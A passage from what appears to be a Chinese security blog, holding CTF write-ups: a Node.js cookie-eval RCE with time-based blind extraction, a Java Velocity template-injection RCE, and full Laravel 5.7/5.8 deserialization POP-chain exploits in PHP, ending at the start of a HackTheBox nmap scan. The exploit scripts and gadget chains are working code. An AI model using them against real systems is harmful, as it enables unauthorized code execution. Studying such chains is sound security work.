也会报错。因为我们此时引号没有被转义直接送入eval.触发报错。所以，如果有着良好的FUZZ手段，黑盒也可以fuzz出问题并确认依赖错误。 最后，我们使用eval语句命令执行。当然因为不通外网没有回显所以非常狗。我最后选择把结果写静态文件。并且这里静态目录是猜了一手public。所以可以直接写/proc/self/cwd/public/css/style.css或者在爆出是app目录后直接写/app/public/cssexp 12345678910url=\"http://dusty.darkarmy.xyz/\"data=\"\"\"j:[&#123;\"id\":1,\"body\": [\"1\",\"1'-console.log(require('child_process').exec('cat /flag.txt &gt; /app/public/css/style.css').toString());//\"]&#125;]\"\"\"print(quote(data))r=requests.get(url,cookies=&#123;'note':quote(data)&#125;)print(r.text)r=requests.get(url+'css/style.css')print(r.text)data=\"\"\"j:[&#123;\"id\":1,\"body\": [\"1\",\"1'-console.log(require('child_process').exec('rm /app/public/css/style.css').toString());//\"]&#125;]\"\"\"print(quote(data))r=requests.get(url,cookies=&#123;'note':quote(data)&#125;) cookie可控所有内容上面说过了。只不过测试时因为路由好用就没控cookie. 做出来后问了下出题人果然不是预期。当然这里我不太确定预期是啥，不过差的应该不多。当然聊完后出题人顺手修了下写文件的权限 :）然后就是这种做法我自己也不是很喜欢。自己出过的nodejs题目在可以rce的情况下我都把工作目录按root权限设置。就是为了防止写文件。不过一般会配置了防止时间盲注，所以都会给出rce的回显 所以这里猜一手本题预期的方法是time-based-rce:exp 12345678910111213141516171819202122232425262728import timeimport requestsfrom urllib.parse import quote,unquoteimport stringurl=\"http://dusty.darkarmy.xyz/\"def js_exp(str1): x=[] str1 = str1.strip(' ') for ch in str1: x.append(str(ord(ch))) t=','.join(x) result='eval(String.fromCharCode('+t+'))' return resultflag=\"\"for num in range(1,50): print(num) for i in string.printable: cmd = \"\"\"require('child_process').execSync(`if [ $(cat /flag.txt | cut -c &#123;&#125;) = '&#123;&#125;' ];then sleep 3;fi`)\"\"\".format(num,i) payload = js_exp(cmd) data = \"\"\"j:[&#123;\"id\":1,\"body\": [\"1\",\"1'-\"\"\" + payload + \"\"\";//\"]&#125;]\"\"\" t = time.time() r = requests.get(url, cookies=&#123;'note': quote(data)&#125;) if time.time() - t &gt; 3: flag += i print(flag) break flag:darkCTF{n0d3js_l1br4r13s_go3s_brrrr!} 因为一些格式原因。我把payload用eval转化了一下，这样看起来更舒服一些.并且不用担心奇奇怪怪的引号问题 :) 不过题目我觉得很有启发性，主要是给了我一些面对nodejs黑盒处理的手段。那就是利用其容易报错的特性进行FUZZ，得到目录这样的关键信息，或者是依赖的关键信息。同时一定程度上可以推测语句，甚至不需要知道依赖漏洞的细节就能直接上手。 最后道个歉，因为把flag写到css里后自己就把css给删了。导致后面题目一直没有style.css…… summary后面的题在打巅峰极客摸鱼时看了看。做了个入门题跟一个User-Agent的报错注入。总之难度整体很入门就没继续看了。没啥说的。巅峰极客体验了一把带飞的感觉。国赛就要靠自己动手丰衣足食了。加油吧。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"钓鱼城-zblog","slug":"钓鱼城-zblog","date":"2020-08-27T12:44:43.000Z","updated":"2021-02-18T05:08:32.118Z","comments":true,"path":"2020/08/27/钓鱼城-zblog/","link":"","permalink":"https://www.bycsec.top/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/","excerpt":"最近忙着复习去了。等到中午概统的复习课结束了才有时间完整看下题。除开一道web-pwn,剩下两个php都是常规考点,就是脑洞跟环境真心恶心人。学弟们也轻松解决，应该不需要什么记录。我自己做了下zblog这道java题,简单记录下。","text":"最近忙着复习去了。等到中午概统的复习课结束了才有时间完整看下题。除开一道web-pwn,剩下两个php都是常规考点,就是脑洞跟环境真心恶心人。学弟们也轻松解决，应该不需要什么记录。我自己做了下zblog这道java题,简单记录下。 最近ciscn赛区第7打进分区赛。强网杯跟着SU拿了第12。(就是自己太捞了,难题一律卡壳,果然不好好研究php跟java是没有出路的).然后为了国赛出了道Node.js不知道有没有机会拿到别的赛区去,估计真拿了会丢人吧。复习的时间也很少。不知道考试会不会炸……但是每次结束一个阶段总要写写文章的。所以形式化地写写。 zblog简单java.就是环境卡的要死。 title参数存在文件读取。后面看源码会发现是任意模板文件渲染的。这里没记错的话有个小细节就是不能随便插../来穿越路径。后面会发现它是拼接路径的所以路径不能随便构造。而且似乎一开始尝试读文件的时候有点迷。文件末尾加了个/才能读到,不加读不到。不知道是什么神必操作。然后后来好像又给修好了？？？ 总之fuzz一下可以找到根目录的位置读到/etc/passwd。接着读下/proc/self/cmdline。 1java -jar /home/ctf/web/target/web-1.0-SNAPSHOT-jar-with-dependencies.jar 个人觉得python跟java环境在有arbitary file read的情况下读下cmdline挺重要的。基本都会暴露绝对路径。比如此处。更重要的是这个target.写过maven项目的都知道maven build好的内容都放在target文件夹下。所以这里基本确定能够确定按maven项目结构来读文件。 只要知道结构就等于把所有文件都暴露出来了。先读下pom.xml。发现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;ctf&lt;/groupId&gt; &lt;artifactId&gt;web&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporing.outputEncoding&gt;UTF-8&lt;/project.reporing.outputEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.sparkjava&lt;/groupId&gt; &lt;artifactId&gt;spark-core&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.sparkjava&lt;/groupId&gt; &lt;artifactId&gt;spark-template-velocity&lt;/artifactId&gt; &lt;version&gt;2.7.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt; &lt;version&gt;1.7.30&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt; &lt;artifactId&gt;velocity&lt;/artifactId&gt; &lt;version&gt;1.7&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;archive&gt; &lt;manifest&gt; &lt;mainClass&gt;Blog&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;make-assemble&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;single&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 从mainclass这里的值可以看出加载的主类Blog.class。按照maven默认没有包的结构直接读../../../../src/main/java/Blog.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import static spark.Spark.*;import java.io.*;import org.apache.velocity.Template;import org.apache.velocity.VelocityContext;import org.apache.velocity.app.VelocityEngine;import spark.template.velocity.VelocityTemplateEngine;import java.io.StringWriter;public class Blog &#123; private static void log(String fname, String content) &#123; try &#123; FileWriter writer = new FileWriter(fname, true); writer.write(content); writer.close(); &#125; catch (IOException e) &#123; &#125; &#125; public static void main(String[] arg) &#123; staticFiles.location(\"/public\"); VelocityEngine velocityEngine = new VelocityEngine(); velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, \"file\"); velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, \"/\"); velocityEngine.init(); VelocityContext context = new VelocityContext(); get(\"/\", (request, response) -&gt; &#123; request.session(true); String title = request.queryParams(\"title\"); if (title != null) &#123; log(\"/tmp/\" + request.session().id(), \"Client IP: \" + request.ip() + \" -&gt; File: \" + title + \"\\n\"); Template template = velocityEngine.getTemplate(\"/home/ctf/web/src/main/resources/templates/\" + title); StringWriter sw = new StringWriter(); template.merge(context, sw); return sw; &#125; Template template = velocityEngine.getTemplate(\"/home/ctf/web/src/main/resources/templates/index\"); StringWriter sw = new StringWriter(); template.merge(context, sw); return sw; &#125;); &#125;&#125; 代码逻辑是title参数除了会按值找到对应模板文件渲染。还会将参数按照sessionid存储到tmp/下。那么此处应该先传payload再进行渲染。即可触发ssti达成rce.session为node0wjq18duzt9pg4ddli5qyyfqn3034.node0这种形式。id去掉.node0即可。 简单写个exp 1234567891011121314151617import requestsurl='http://122.112.253.135/'session='node0wjq18duzt9pg4ddli5qyyfqn3034.node0'id=session.rstrip('.node0')'''data=&#123;'title':'../../../../src/main/java/Blog.java'&#125;r=requests.get(url,params=data,cookies=&#123;'JSESSIONID':session&#125;)print(r.text)'''data=&#123;'title':\"#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('grep -r flag /tmp')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end\"&#125;r=requests.get(url,params=data,cookies=&#123;'JSESSIONID':session&#125;)data=&#123;'title':'../../../../../../../tmp/'+id&#125;r=requests.get(url,params=data,cookies=&#123;'JSESSIONID':session&#125;)print(r.text) 这个payload是找了个velocity回显的payload写的。逻辑上还是反射就不多说了。其实之前学习JavaSec那个项目里的sstipayload也能执行。但是似乎外带时有点问题。 唯一比较狗的就是flag在/tmp下。在tmp列目录会因为session文件太多进行相关操作直接卡死。一个个试发现最后只有grep -r flag /tmp不会卡。做完后发现换了个节点，flag放根目录了…… 就这么多吧。希望新学期一切顺利。比赛成绩能更进一步。整个暑假学习的知识,做过的题，打过的比赛让这两个月没有荒废，收获还是挺大的。比较可惜的是本来打算跟完的Commoncollections几条链子以及jackson，shiro等等exp的原理没能全部完成。希望过段时间能把坑填了。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"Laravel-popchain","slug":"Laravel-popchain","date":"2020-08-17T07:06:24.000Z","updated":"2021-02-18T05:09:31.880Z","comments":true,"path":"2020/08/17/Laravel-popchain/","link":"","permalink":"https://www.bycsec.top/2020/08/17/Laravel-popchain/","excerpt":"考虑了下还是打算把laravel的链子跟一遍。看了下基本上就5.7,5.8两个版本的rce反序列化popchain。所以工作量应该不大。正好最近完成tp系列的popchain学习审计代码的感觉还在,那就趁热打铁吧 。","text":"考虑了下还是打算把laravel的链子跟一遍。看了下基本上就5.7,5.8两个版本的rce反序列化popchain。所以工作量应该不大。正好最近完成tp系列的popchain学习审计代码的感觉还在,那就趁热打铁吧 。 关于代码获取:composer create-project --prefer-dist laravel/laravel laravel58后面加上&quot;5.7.*&quot;下载5.7版本的。 如果下载出错最好换下composer源。之后可以直接php artisan serve --host=0.0.0.0.这样php-cli就会默认从8000端口监听起一个web服务。直接按照public对外显示。 然后默认关于laravel的一个命令行工具artisan。我个人认为审计代码的话如果是白盒审计看下路由,会用php artisan route:list就差不多了。当然后面如果是开发的话肯定要全面学习下具体用法。 laravel5.7-unserialize首先我们需要添加路由与控制器代码给一个反序列化入手点。routes/web.php 123456&lt;?phpRoute::get('/', function () &#123; return view('welcome');&#125;);Route::get(\"/demo\",\"\\App\\Http\\Controllers\\DemoController@demo\"); 添加一个demo路由对应DemoController。所以直接在app/Http/Controllers下增添一个类DemoController。这样命名空间之类的也会自动生成好。 123456789101112131415161718&lt;?phpnamespace App\\Http\\Controllers;class DemoController extends Controller&#123; public function demo() &#123; if(isset($_GET['c']))&#123; $code = $_GET['c']; unserialize($code); &#125; else&#123; highlight_file(__FILE__); &#125; return \"Welcome to laravel5.7\"; &#125;&#125; 这样就可以通过demo路由进行参数传递。exp尝试执行whoami 接下来就是跟链子了。首先是入手点找__destruct()自不必说。此处入手的destruct其实非常多。我们找到src\\Illuminate\\Foundation\\Testing\\PendingCommand.php。即 Illuminate/Foundation/Testing/PendingCommand类 12345678910111213141516171819202122232425262728293031323334public function __destruct()&#123; if ($this-&gt;hasExecuted) &#123; return; &#125; $this-&gt;run();&#125;public function run()&#123; $this-&gt;hasExecuted = true; $this-&gt;mockConsoleOutput(); try &#123; $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); &#125; catch (NoMatchingExpectationException $e) &#123; if ($e-&gt;getMethodName() === 'askQuestion') &#123; $this-&gt;test-&gt;fail('Unexpected question \"'.$e-&gt;getActualArguments()[0]-&gt;getQuestion().'\" was asked.'); &#125; throw $e; &#125; if ($this-&gt;expectedExitCode !== null) &#123; $this-&gt;test-&gt;assertEquals( $this-&gt;expectedExitCode, $exitCode, \"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;.\" ); &#125; return $exitCode;&#125; 终点其实就在run方法中$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);这句代码。关于它的真正含义我们先不去深究。从语义上看似乎是调用了内核进行call的命令执行。而它是在trycatch语句中执行的。所以需要在到这一不前都不会出现报错。 重点跟进mockConsoleOutput. 123456789101112131415161718192021222324protected function mockConsoleOutput()&#123; $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [ (new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(), ]); foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) &#123; $mock-&gt;shouldReceive('askQuestion') -&gt;once() -&gt;ordered() -&gt;with(Mockery::on(function ($argument) use ($question) &#123; return $argument-&gt;getQuestion() == $question[0]; &#125;)) -&gt;andReturnUsing(function () use ($question, $i) &#123; unset($this-&gt;test-&gt;expectedQuestions[$i]); return $question[1]; &#125;); &#125; $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) &#123; return $mock; &#125;);&#125; 这里就有一个小细节。看到七月火师傅跟这里时选择打断点然后直接step over单步跳过。发现能正常执行到foreach。所以就没去看$mock那行的代码。这应该是为了减少不必要的审计代码量。(听说一路看下去的话又臭又长……) 现在可以看向$this-&gt;test-&gt;expectedQuestions这句。其中expectedQuestions是个数组。从执行exp来看,我们属性中并没有$this-&gt;test对象.所以会触发__get()既然如此其实就是找__get方法返回值可控的类了。这里找到src\\Faker\\DefaultGenerator.php 1234public function __get($attribute)&#123; return $this-&gt;default;&#125; 所以大致的一个脉络已经出来了。但是我们对某些变量还是不清楚。同时也不知道是否会有报错退出。因此可以用一个半成品poc来探测。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace Illuminate\\Foundation\\Testing&#123; class PendingCommand&#123; public $test; protected $app; protected $command; protected $parameters; public function __construct($test, $app, $command, $parameters) &#123; $this-&gt;test = $test; $this-&gt;app = $app; $this-&gt;command = $command; $this-&gt;parameters = $parameters; &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($default = null) &#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Illuminate\\Foundation&#123; class Application&#123; public function __construct() &#123; &#125; &#125;&#125;namespace&#123; $defaultgenerator = new Faker\\DefaultGenerator(array(\"1\" =&gt; \"1\")); $application = new Illuminate\\Foundation\\Application(); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, 'system', array('id')); echo urlencode(serialize($pendingcommand));&#125; 这里PendingCommand类的四个参数是原构造函数中就有的。而为什么会在这里出现Illuminate\\Foundation\\Application要在后面解释。 我们还是直接打断点看它的执行。单步跳过的话会发现到$this-&gt;app-&gt;bind为止都是可以正常进行的。直到$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);这个我们命令执行的最后一步才抛出错误。一路跟过去可以看到报错具体内容 那么我们肯定得深入下这行代码。这里我们需要添加代码看$this-&gt;app[Kernel::class].因为直接调用的话我们是没法看出Kernel::class的。所以比较好的方法还是单独拿出来看。可以看到。$this-&gt;app即我们之前exp中实例化的Illuminate\\Foundation\\Application类的对象.而Kernel::class会固定返回字符串Illuminate\\Contracts\\Console\\Kernel 接下来我们发现只要单步跳过$app = $this-&gt;app[Kernel::class];就会出错抛出跟之前调用反序列化时一样的错误。所以问题肯定出在这句代码上。那么一路跟进会发现是调用了这么几个函数 1234567891011121314151617181920212223242526272829303132333435363738//Pipelineprotected function handleException($passable, Exception $e)&#123;$handler = $this-&gt;container-&gt;make(ExceptionHandler::class)......//Applicationpublic function make($abstract, array $parameters = [])&#123; $abstract = $this-&gt;getAlias($abstract); if (isset($this-&gt;deferredServices[$abstract]) &amp;&amp; ! isset($this-&gt;instances[$abstract])) &#123; $this-&gt;loadDeferredProvider($abstract); &#125; return parent::make($abstract, $parameters);&#125;//Containerpublic function make($abstract, array $parameters = [])&#123; return $this-&gt;resolve($abstract, $parameters);&#125;protected function resolve($abstract, $parameters = [])&#123; $abstract = $this-&gt;getAlias($abstract); $needsContextualBuild = ! empty($parameters) || ! is_null( $this-&gt;getContextualConcrete($abstract) ); if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123; return $this-&gt;instances[$abstract]; &#125;...... 这里一路跟过来会发现在Application类调用父类也就是Container类的make方法,进一步到达resolve方法时。有一处可控点return $this-&gt;instances[$abstract]; 还记得我们是跟进$this-&gt;app[Kernel::class]来到这个返回值的吗?实际上我们最开始寻找命令执行时。是以$this-&gt;app[Kernel::class]=&gt;call(xxx)尝试调用命令的。那么既然这里app对象可控了,我们就可以调用任意对象的call方法了。 这也就是为什么我们前面选择Application类的原因。它继承了Container类。所以调用的是Container的call方法。我们跟进看下 123456789101112131415161718192021222324252627282930//Containerpublic function call($callback, array $parameters = [], $defaultMethod = null)&#123; return BoundMethod::call($this, $callback, $parameters, $defaultMethod);&#125;//BoundMethodpublic static function call($container, $callback, array $parameters = [], $defaultMethod = null)&#123; if (static::isCallableWithAtSign($callback) || $defaultMethod) &#123; return static::callClass($container, $callback, $parameters, $defaultMethod); &#125; return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) &#123; return call_user_func_array( $callback, static::getMethodDependencies($container, $callback, $parameters) ); &#125;);&#125;protected static function getMethodDependencies($container, $callback, array $parameters = [])&#123; $dependencies = []; foreach (static::getCallReflector($callback)-&gt;getParameters() as $parameter) &#123; static::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies); &#125; return array_merge($dependencies, $parameters);&#125; 这里发现实际调用的是BoundMethod的闭包函数。关于闭包函数在js中曾经听说过。闭包主要是使用:一个内部函数可以引用外部函数的参数和变量，参数和变量就不会被收回的机制。 这里getMethodDependencies返回两个数组的合并数据。然而其中$dependencies数组是个空的。那么返回的还是我们可控的数组。既然如此。调用call_user_func_array()的这句代码两个参数就都是可控的。可以命令执行了。 rce exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpnamespace Illuminate\\Foundation\\Testing&#123; class PendingCommand&#123; public $test; protected $app; protected $command; protected $parameters; public function __construct($test, $app, $command, $parameters) &#123; $this-&gt;test = $test; $this-&gt;app = $app; $this-&gt;command = $command; $this-&gt;parameters = $parameters; &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($default = null) &#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Illuminate\\Foundation&#123; class Application&#123; protected $instances = []; public function __construct($instances = []) &#123; $this-&gt;instances['Illuminate\\Contracts\\Console\\Kernel'] = $instances; &#125; &#125;&#125;namespace&#123; $defaultgenerator = new Faker\\DefaultGenerator(array(\"1\" =&gt; \"1\")); $app = new Illuminate\\Foundation\\Application(); $application = new Illuminate\\Foundation\\Application($app); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, 'system', array('whoami')); echo urlencode(serialize($pendingcommand));&#125; 这里只需要增加Application类的内容。让它在程序找向$this-&gt;instances[&#39;Illuminate\\Contracts\\Console\\Kernel&#39;]找向它自己。这样我们就能调用它的call方法执行call_user_func_array(&#39;system&#39;,&#39;whoami&#39;)了. 小结一下。5.7的pop链从exp看起来也就三个类的事。但是其中调试的功夫要求比起thinkphp要高出不少。其中非常重要的一点就是通过动态调试找到Kernel::class的真正字符串值。并一路找到可控点来进行命令执行。 laravel5.8-unserialize5.8其实之前做国赛题目时跟过一次了。不过印象不太深刻了。所以再来看一次。其中有一条链是靠symfony组件做的。就不跟了。(实验了下最新版本symfony组件没法用了) 我主要看七月火师傅介绍的一条链。来自p神小密圈。然后还有一条链是来自护网杯的非预期。跟第五空间一个性质。如果是按composer直接下载的话。两条链都可以用。还是老方法我们直接增加反序列化路由跟控制器代码。 入手点是一个貌似在laravel很多链子中都通用的destruct 1234public function __destruct()&#123; $this-&gt;events-&gt;dispatch($this-&gt;event);&#125; 很明显这里就有两种思路1.全局找存在dispatch的有用方法。2.全局找__call方法 popchain1对于我个人而言这里可以说是第一反应就想去找__call.因为很明显的双参数均可控.php中__call这种魔术方法本来就是设计出来用来动态调用的。所以肯定有类中使用call_user_func这样的方式进行命令执行。我们不难找到符合条件的Generator类 12345678910111213141516public function format($formatter, $arguments = array())&#123; return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);&#125;public function __call($method, $attributes)&#123; return $this-&gt;format($method, $attributes);&#125;public function getFormatter($formatter)&#123; if (isset($this-&gt;formatters[$formatter])) &#123; return $this-&gt;formatters[$formatter]; &#125; ...... 全部可控。所以最终call_user_func直接命令执行。这个真的是太简单了。难怪第5空间会换了__destruct. (之前因为第5空间打的太烂了没进线下就没仔细研究。结果仔细一看发现原来当时那个是5.7的版本啊……)说起来护网杯那题destruct代码调用的是$this-&gt;events-&gt;fire($this-&gt;event);。貌似跟官方源码不一样？但这条链偏偏是个非预期。有点迷。 popchain1 exp 1234567891011121314151617181920212223242526272829303132333435&lt;?phpnamespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($events, $event) &#123; $this-&gt;event = $event; $this-&gt;events = $events; &#125; &#125;&#125;namespace Faker&#123; class Generator &#123; protected $formatters; function __construct($format)&#123; $this-&gt;formatters = $format; &#125; &#125;&#125;namespace&#123; $fs = array(\"dispatch\"=&gt;\"system\"); $gen = new Faker\\Generator($fs); $pb = new Illuminate\\Broadcasting\\PendingBroadcast($gen,\"whoami\"); echo(urlencode(serialize($pb)));&#125; popchain2来自上面这条链子的变招。刚刚说了Symphony最新版本已经没法用了。其主要原因是,禁止对TagAwareAdapter类反序列化。所以加了一个__wakeup。根本到不了destruct那 123456789public function __wakeup()&#123; throw new \\BadMethodCallException('Cannot unserialize '.__CLASS__);&#125;public function __destruct()&#123; $this-&gt;commit();&#125; 但是有Symfony的情况下还是可以用其他类。比如我们搜索__destruct找到很明显的双参数可控调用 123456789101112131415161718class ImportConfigurator&#123; use Traits\\HostTrait; use Traits\\PrefixTrait; use Traits\\RouteTrait; private $parent; public function __construct(RouteCollection $parent, RouteCollection $route) &#123; $this-&gt;parent = $parent; $this-&gt;route = $route; &#125; public function __destruct() &#123; $this-&gt;parent-&gt;addCollection($this-&gt;route); &#125; destruct是一样的可控参数调用函数。所以殊途同归。与上面一样的的性质。exp把dispatch改为addCollection就行了。 exp2 12345678910111213141516171819202122232425262728293031&lt;?phpnamespace Symfony\\Component\\Routing\\Loader\\Configurator &#123; class ImportConfigurator&#123; private $parent; private $route; public function __construct( $parent, $route) &#123; $this-&gt;parent = $parent; $this-&gt;route = $route; &#125; &#125;&#125;namespace Faker&#123; class Generator &#123; protected $formatters; function __construct($format)&#123; $this-&gt;formatters = $format; &#125; &#125;&#125;namespace&#123; $fs = array(\"addCollection\"=&gt;\"system\"); $gen = new Faker\\Generator($fs); $pb = new Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator($gen,\"whoami\"); echo(urlencode(serialize($pb)));&#125; 这里不需要在意ImportConfigurator原本构造函数中继承和定死的类型。因为是直接进行链式调用。 popchain3回到开始。我们说除了用__call打组合拳。还可以找有用的全局找存在dispatch方法。比如src\\Illuminate\\Bus\\Dispatcher.php 1234567891011121314151617181920public function dispatch($command)&#123; if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123; return $this-&gt;dispatchToQueue($command); &#125; return $this-&gt;dispatchNow($command);&#125;protected function commandShouldBeQueued($command)&#123; return $command instanceof ShouldQueue;&#125;public function dispatchToQueue($command)&#123; $connection = $command-&gt;connection ?? null; $queue = call_user_func($this-&gt;queueResolver, $connection); ...... 首先if判断里调用commandShouldBeQueued。然后调用dispatchToQueue.可以看到。$command只要是实现ShouldQueue接口的类即可进入下面,存在call_user_func的命令调用。 现在可以调用任意类的任意方法。那就只需要找一个可用类即可。比如EvalLoader。其load方法含有eval语句. 12345678910111213141516171819202122class EvalLoader implements Loader&#123; public function load(MockDefinition $definition) &#123; if (class_exists($definition-&gt;getClassName(), false)) &#123; return; &#125; eval(\"?&gt;\" . $definition-&gt;getCode()); &#125;&#125;public function getClassName()&#123; return $this-&gt;config-&gt;getName();&#125;public function getCode()&#123; return $this-&gt;code;&#125; 看到只要保证$this-&gt;config的类存在getName方法。就可以跳过return执行eval.这里选择PhpParser\\Node\\Scalar\\MagicConst\\Line类 exp3 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpnamespace PhpParser\\Node\\Scalar\\MagicConst&#123; class Line &#123;&#125;&#125;namespace Mockery\\Generator&#123; class MockDefinition &#123; protected $config; protected $code; public function __construct($config, $code) &#123; $this-&gt;config = $config; $this-&gt;code = $code; &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher &#123; protected $queueResolver; public function __construct($queueResolver) &#123; $this-&gt;queueResolver = $queueResolver; &#125; &#125;&#125;namespace Illuminate\\Foundation\\Console&#123; class QueuedCommand &#123; public $connection; public function __construct($connection) &#123; $this-&gt;connection = $connection; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($events, $event) &#123; $this-&gt;events = $events; $this-&gt;event = $event; &#125; &#125;&#125;namespace&#123; $line = new PhpParser\\Node\\Scalar\\MagicConst\\Line(); $mockdefinition = new Mockery\\Generator\\MockDefinition($line,'&lt;?php phpinfo();?&gt;'); $evalloader = new Mockery\\Loader\\EvalLoader(); $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evalloader,'load')); $queuedcommand = new Illuminate\\Foundation\\Console\\QueuedCommand($mockdefinition); $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$queuedcommand); echo urlencode(serialize($pendingbroadcast));&#125; summary沒想到一个下午能把laravel主要的两个版本反序列化跟完。还是收获挺大的。不过实战中想遇到laravel反序列化比较困难。使用phar来进行触发应该是比较理想的可能方式。到此php反序列化就告一段落了吧。剩下的假期就复习之余抽空看java了。","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"}]},{"title":"hackthebox-Unbalanced","slug":"hackthebox-Unbalanced","date":"2020-08-15T08:17:48.000Z","updated":"2021-02-18T05:09:27.449Z","comments":true,"path":"2020/08/15/hackthebox-Unbalanced/","link":"","permalink":"https://www.bycsec.top/2020/08/15/hackthebox-Unbalanced/","excerpt":"Unbalanced 可能是自己做过的htb困难靶机中里最简单的一个。其主要难度来自于最开始的起手式部分。比较需要耐心,但是没有难度。而提权部分直接可以用nday打。这对于一个困难靶机而言基本太过简单了。所以到时简单分析下这个用到的cve。","text":"Unbalanced 可能是自己做过的htb困难靶机中里最简单的一个。其主要难度来自于最开始的起手式部分。比较需要耐心,但是没有难度。而提权部分直接可以用nday打。这对于一个困难靶机而言基本太过简单了。所以到时简单分析下这个用到的cve。 靶机 10.10.10.200 攻击机 10.10.14.11 initial footholdnmap 123456789101112131415161718# Nmap 7.80 scan initiated Fri Aug 7 11:01:56 2020 as: nmap -sC -sV -oA nmap/unbalance 10.10.10.200Nmap scan report for 10.10.10.200Host is up (0.43s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)| 256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)|_ 256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 